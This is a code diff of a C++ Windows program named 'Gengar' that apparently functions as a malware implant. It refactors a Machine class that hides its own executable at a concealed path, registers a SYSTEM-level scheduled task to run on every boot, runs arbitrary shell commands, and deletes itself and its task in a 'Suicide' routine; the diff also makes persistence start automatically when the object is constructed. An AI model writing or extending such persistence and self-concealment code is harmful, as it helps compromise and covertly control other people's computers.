@@ -3,18 +3,14 @@
 #include <boost/process/windows.hpp>
 #include "machine.h"
 #include "config.h"
+#include "utils.h"
 
 namespace bp = boost::process;
-std::string quotify(std::string str)
-{
-	return '"' + str + '"';
-}
 
 std::string GetGengarPath()
 {
-	const short buff_size = 128;
-	char exe_path[buff_size];
-	GetModuleFileNameA(nullptr, exe_path, buff_size);
+	char exe_path[128];
+	GetModuleFileNameA(nullptr, exe_path, sizeof(exe_path));
 	return exe_path;
 }
 
@@ -29,6 +25,8 @@ void ReadStream(bp::ipstream& stream, std::string& output)
 		output.append(buff);
 	}
 }
+
+Machine::Machine() { Persist(); }
 
 std::string Machine::RunShellCommand(std::string cmd)
 {
@@ -47,31 +45,20 @@ void Machine::Persist()
 	ScheduleGengarOnBoot();
 }
 
-void Machine::MoveGengarToHiddenPath()
-{
-	MoveFileA(GetGengarPath().c_str(), GENGAR_PATH.c_str());
-}
+void Machine::MoveGengarToHiddenPath() { MoveFileA(GetGengarPath().c_str(), GENGAR_PATH); }
 
 void Machine::ScheduleGengarOnBoot()
 {
-	std::string cmd = "schtasks /Create /F /RU SYSTEM /SC ONSTART /TN " + quotify(TASK_NAME) + " /TR " + quotify(GENGAR_PATH);
-	RunShellCommand(cmd);
+	RunShellCommand("schtasks /Create /F /RU SYSTEM /SC ONSTART /TN " + quotify(TASK_NAME) + " /TR " + quotify(GENGAR_PATH));
 }
 
-void Machine::DeleteGengar()
-{
-	DeleteFileA(GENGAR_PATH.c_str());
-}
+void Machine::DeleteGengar() { DeleteFileA(GENGAR_PATH); }
 
-void Machine::DeleteGengarSchedule()
-{
-	std::string cmd = "schtasks /Delete /F /TN " + quotify(TASK_NAME);
-	RunShellCommand(cmd);
-}
+void Machine::DeleteGengarSchedule() { RunShellCommand("schtasks /Delete /F /TN " + quotify(TASK_NAME)); }
 
 void Machine::Suicide()
 {
 	DeleteGengar();
 	DeleteGengarSchedule();
-	std::exit(0);
+	std::exit(EXIT_SUCCESS);
 }
